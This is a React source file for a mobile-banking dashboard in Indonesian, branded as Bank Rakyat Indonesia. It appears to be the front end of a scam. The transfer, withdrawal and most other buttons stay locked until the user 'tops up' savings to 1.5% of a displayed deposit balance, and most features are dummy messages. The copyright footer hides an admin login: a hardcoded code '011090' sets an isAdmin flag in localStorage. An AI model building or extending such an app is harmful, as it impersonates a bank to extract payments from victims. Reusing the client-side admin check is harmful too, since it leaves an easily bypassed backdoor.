import React, { useState, useEffect } from 'react';
import { useAuth } from '@/contexts/AuthContext';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
import { AlertDialog, AlertDialogAction, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from '@/components/ui/alert-dialog';
import { Input } from '@/components/ui/input';
import { useToast } from '@/hooks/use-toast';
import { Eye, EyeOff, CreditCard, ArrowUpDown, Smartphone, Zap } from 'lucide-react';
import { TransferDialog } from './TransferDialog';
import NotificationDropdown from '@/components/NotificationDropdown';

const Dashboard: React.FC = () => {
  const { user, logout, updateBalance, refreshUser } = useAuth();
  const { toast } = useToast();
  const [showBalance, setShowBalance] = useState(true);
  const [isWithdrawOpen, setIsWithdrawOpen] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [currentTime, setCurrentTime] = useState(new Date());
  const [isTransferOpen, setIsTransferOpen] = useState(false);

  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    refreshUser();
  }, []);

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('id-ID', {
      style: 'currency',
      currency: 'IDR',
      minimumFractionDigits: 0,
      maximumFractionDigits: 0,
    }).format(amount);
  };

  const formatTime = (date: Date) => {
    return date.toLocaleTimeString('id-ID', {
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  const getGreeting = () => {
    const hour = currentTime.getHours();
    if (hour < 12) return 'Selamat Pagi';
    if (hour < 17) return 'Selamat Siang';
    if (hour < 19) return 'Selamat Sore';
    return 'Selamat Malam';
  };

  const checkWithdrawRequirement = () => {
    if (!user) return false;
    const requiredSavings = user.saldo_deposito * 0.015; // 1.5%
    return user.saldo_tabungan >= requiredSavings;
  };

  const getRequiredAmount = () => {
    if (!user) return 0;
    const requiredSavings = user.saldo_deposito * 0.015;
    return Math.max(0, requiredSavings - user.saldo_tabungan);
  };

  const handleMenuClick = (menuName: string) => {
    if (!checkWithdrawRequirement()) {
      const requiredAmount = getRequiredAmount();
      toast({
        title: "Syarat belum terpenuhi",
        description: `Untuk menggunakan fitur ${menuName}, Anda wajib memiliki saldo tabungan minimal 1,5% dari total deposito. Saldo Anda masih kurang sebesar ${formatCurrency(requiredAmount)}. Silakan lakukan top up terlebih dahulu.`,
        variant: "destructive",
      });
      return;
    }

    // Show dummy feature
    toast({
      title: `Fitur ${menuName}`,
      description: `Fitur ${menuName} akan segera tersedia. Terima kasih!`,
    });
  };

  const handleWithdraw = async () => {
    if (!user) return;

    const amount = parseInt(withdrawAmount);
    if (isNaN(amount) || amount <= 0) {
      toast({
        title: "Error",
        description: "Masukkan jumlah yang valid",
        variant: "destructive",
      });
      return;
    }

    if (amount > user.saldo_deposito) {
      toast({
        title: "Error",
        description: "Saldo deposito tidak mencukupi",
        variant: "destructive",
      });
      return;
    }

    if (!checkWithdrawRequirement()) {
      const requiredAmount = getRequiredAmount();
      toast({
        title: "Syarat belum terpenuhi",
        description: `Untuk menarik dana deposito, Anda wajib memiliki saldo tabungan minimal 1,5% dari total deposito. Saldo Anda masih kurang sebesar ${formatCurrency(requiredAmount)}. Silakan lakukan top up terlebih dahulu.`,
        variant: "destructive",
      });
      return;
    }

    try {
      const newDeposito = user.saldo_deposito - amount;
      const newTabungan = user.saldo_tabungan + amount;
      
      await updateBalance(newTabungan, newDeposito);
      
      toast({
        title: "Penarikan berhasil",
        description: `Berhasil menarik ${formatCurrency(amount)} dari deposito`,
      });
      
      setIsWithdrawOpen(false);
      setWithdrawAmount('');
    } catch (error) {
      toast({
        title: "Error",
        description: "Gagal melakukan penarikan",
        variant: "destructive",
      });
    }
  };

  if (!user) return null;

  const totalSaldo = user.saldo_tabungan + user.saldo_deposito;

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-blue-900 to-blue-800">
      {/* Header */}
      <div className="bg-gradient-to-r from-bri-blue to-bri-dark-blue p-4 text-white">
        <div className="flex items-center justify-between mb-2">
          <div className="flex items-center space-x-3">
            <div className="w-8 h-8 bg-white rounded-md flex items-center justify-center">
              <span className="text-bri-blue font-bold text-sm">BRI</span>
            </div>
            <span className="text-sm font-medium">{formatTime(currentTime)}</span>
          </div>
          <NotificationDropdown />
        </div>
        <h1 className="text-lg font-medium">
          {getGreeting()}, {user.username.split(' ')[0]}
        </h1>
      </div>

      {/* Main Balance Card */}
      <div className="p-4 -mt-6 relative z-10">
        <Card className="bg-gradient-to-br from-bri-blue to-bri-dark-blue text-white border-0 shadow-xl">
          <CardContent className="p-6">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-sm font-medium opacity-90">Saldo Rekening Utama</h2>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setShowBalance(!showBalance)}
                className="text-white hover:bg-white/20 p-1"
              >
                {showBalance ? <Eye size={16} /> : <EyeOff size={16} />}
              </Button>
            </div>
            
            <div className="mb-6">
              <p className="text-2xl font-bold">
                {showBalance ? formatCurrency(totalSaldo) : 'Rp ••••••'}
              </p>
            </div>

            <div className="grid grid-cols-2 gap-4 mb-4">
              <div className="bg-white/10 rounded-lg p-3">
                <p className="text-xs opacity-75 mb-1">Saldo Tabungan</p>
                <p className="font-semibold">
                  {showBalance ? formatCurrency(user.saldo_tabungan) : 'Rp ••••••'}
                </p>
              </div>
              <div className="bg-white/10 rounded-lg p-3">
                <p className="text-xs opacity-75 mb-1">Saldo Deposito</p>
                <p className="font-semibold">
                  {showBalance ? formatCurrency(user.saldo_deposito) : 'Rp ••••••'}
                </p>
              </div>
            </div>

            <div className="flex items-center justify-between text-sm">
              <span>Semua Rekeningmu</span>
              <span>→</span>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Quick Actions */}
      <div className="px-4 mb-6">
        <div className="grid grid-cols-4 gap-3">
          <div 
            className="bg-white rounded-xl p-3 text-center shadow-sm cursor-pointer hover:bg-gray-50"
            onClick={() => {
              if (!checkWithdrawRequirement()) {
                const requiredAmount = getRequiredAmount();
                toast({
                  title: "Syarat belum terpenuhi",
                  description: `Untuk menggunakan fitur Transfer, Anda wajib memiliki saldo tabungan minimal 1,5% dari total deposito. Saldo Anda masih kurang sebesar ${formatCurrency(requiredAmount)}. Silakan lakukan top up terlebih dahulu.`,
                  variant: "destructive",
                });
                return;
              }
              setIsTransferOpen(true);
            }}
          >
            <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center mx-auto mb-2">
              <ArrowUpDown className="w-5 h-5 text-bri-blue" />
            </div>
            <span className="text-xs font-medium text-gray-700">Transfer</span>
          </div>
          
          <div 
            className="bg-white rounded-xl p-3 text-center shadow-sm cursor-pointer hover:bg-gray-50"
            onClick={() => handleMenuClick('BRIVA')}
          >
            <div className="w-10 h-10 bg-teal-100 rounded-lg flex items-center justify-center mx-auto mb-2">
              <span className="text-teal-600 font-bold text-sm">BRIVA</span>
            </div>
            <span className="text-xs font-medium text-gray-700">BRIVA</span>
          </div>
          
          <div 
            className="bg-white rounded-xl p-3 text-center shadow-sm cursor-pointer hover:bg-gray-50"
            onClick={() => handleMenuClick('E-Wallet')}
          >
            <div className="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center mx-auto mb-2">
              <CreditCard className="w-5 h-5 text-green-600" />
            </div>
            <span className="text-xs font-medium text-gray-700">E-Wallet</span>
          </div>
          
          <div 
            className="bg-white rounded-xl p-3 text-center shadow-sm cursor-pointer hover:bg-gray-50"
            onClick={() => handleMenuClick('Pulsa/Data')}
          >
            <div className="w-10 h-10 bg-gray-100 rounded-lg flex items-center justify-center mx-auto mb-2">
              <Smartphone className="w-5 h-5 text-gray-600" />
            </div>
            <span className="text-xs font-medium text-gray-700">Pulsa/Data</span>
          </div>
        </div>
      </div>

      {/* Search */}
      <div className="px-4 mb-6">
        <div className="bg-white rounded-xl p-4 flex items-center shadow-sm">
          <span className="text-bri-blue mr-3">🔍</span>
          <span className="text-gray-500">Cari Fitur</span>
        </div>
      </div>

      {/* Additional Services */}
      <div className="px-4 mb-6">
        <div className="grid grid-cols-4 gap-3">
          <div 
            className="bg-white rounded-xl p-3 text-center shadow-sm cursor-pointer hover:bg-gray-50"
            onClick={() => handleMenuClick('Top Up')}
          >
            <div className="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center mx-auto mb-2">
              <span className="text-green-600 text-lg">+</span>
            </div>
            <span className="text-xs font-medium text-gray-700">Top Up</span>
          </div>
          
          <div 
            className="bg-white rounded-xl p-3 text-center shadow-sm cursor-pointer hover:bg-gray-50"
            onClick={() => handleMenuClick('Tagihan')}
          >
            <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center mx-auto mb-2">
              <span className="text-bri-blue font-bold text-xs">Rp ✓</span>
            </div>
            <span className="text-xs font-medium text-gray-700">Tagihan</span>
          </div>
          
          <div 
            className="bg-white rounded-xl p-3 text-center shadow-sm cursor-pointer hover:bg-gray-50"
            onClick={() => handleMenuClick('Setor & Tarik Tunai')}
          >
            <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center mx-auto mb-2">
              <span className="text-bri-blue font-bold text-xs">ATM</span>
            </div>
            <span className="text-xs font-medium text-gray-700">Setor & Tarik Tunai</span>
          </div>
          
          <Dialog open={isWithdrawOpen} onOpenChange={setIsWithdrawOpen}>
            <DialogTrigger asChild>
              <div className="bg-white rounded-xl p-3 text-center shadow-sm cursor-pointer">
                <div className="w-10 h-10 bg-pink-100 rounded-lg flex items-center justify-center mx-auto mb-2">
                  <span className="text-pink-600 text-lg">💰</span>
                </div>
                <span className="text-xs font-medium text-gray-700">Tarik Deposito</span>
              </div>
            </DialogTrigger>
            <DialogContent>
              <DialogHeader>
                <DialogTitle>Tarik Dana Deposito</DialogTitle>
              </DialogHeader>
              <div className="space-y-4">
                <div>
                  <label className="text-sm font-medium">Jumlah Penarikan</label>
                  <Input
                    type="number"
                    placeholder="Masukkan jumlah"
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    className="mt-1"
                  />
                </div>
                <div className="text-sm text-gray-600">
                  <p>Saldo Deposito: {formatCurrency(user.saldo_deposito)}</p>
                  <p>Saldo Tabungan: {formatCurrency(user.saldo_tabungan)}</p>
                  <p className="text-xs mt-2 text-orange-600">
                    * Syarat: Saldo tabungan minimal 1,5% dari total deposito
                  </p>
                </div>
                <Button 
                  onClick={handleWithdraw} 
                  className="w-full bg-bri-blue hover:bg-bri-dark-blue"
                >
                  Tarik Dana
                </Button>
              </div>
            </DialogContent>
          </Dialog>
        </div>
      </div>

      {/* Transfer Dialog */}
      <TransferDialog 
        open={isTransferOpen} 
        onOpenChange={setIsTransferOpen} 
      />

      {/* Footer - Hidden Admin Access */}
      <div className="mt-8 bg-bri-dark-blue text-white text-center py-6">
        <div 
          className="cursor-pointer select-none"
          onClick={() => {
            const code = prompt('Masukkan kode akses admin:');
            if (code === '011090') {
              localStorage.setItem('isAdmin', 'true');
              window.location.href = '/admin';
            }
          }}
        >
          <p className="text-sm opacity-75">© 2025 Bank Rakyat Indonesia</p>
          <p className="text-xs opacity-50">Deposit BRI - Aman & Terpercaya</p>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;